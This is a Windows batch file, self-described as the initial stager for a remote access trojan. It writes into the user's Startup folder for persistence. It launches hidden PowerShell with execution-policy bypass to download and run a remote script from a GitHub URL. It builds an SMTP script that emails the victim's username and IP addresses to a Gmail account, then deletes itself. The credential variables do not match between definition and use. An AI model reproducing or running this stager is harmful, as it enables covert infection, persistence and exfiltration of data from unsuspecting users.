@echo off
@REM initial stager for RAT
@REM created by: Sunnickel
@REM inspired by: COSMO

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into Startup Dir
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden -ep bypass "Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/wget.cmd -OutFile wget.cmd" 

@REM setup smtp
(
    echo $uname = "example@gmail.com" 
    echo $pword =  "pword"

    echo $ipEthernet = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias *Ethernet*).IPAddress
    echo $ipWlan = (Get-NetIPAddress -AddressFamily IPv4 -PrefixOrigin Dhcp -AddressState Preferred -InterfaceAlias WLAN).IPAddress

    echo echo "Ethernet: $ipEthernet WLan: $ipWlan" > $env:UserName.rat

    echo # email process
    echo $subject = "$env:UserName logs"
    echo $smtp = New-Object System.Net.Mail.SmtpClient("smtp.gmail.com", "587");
    echo $smtp.EnableSSL = $true
    echo $smtp.Credentials = New-Object System.Net.NetworkCredential($email, $password);
    echo $smtp.Send($email, $email, $subject, $ip);
) > smtp.txt

@REM run payload
powershell ./wget.cmd

@REM cd change back to initial location
cd "%INITIALPATH%"
del initial.cmd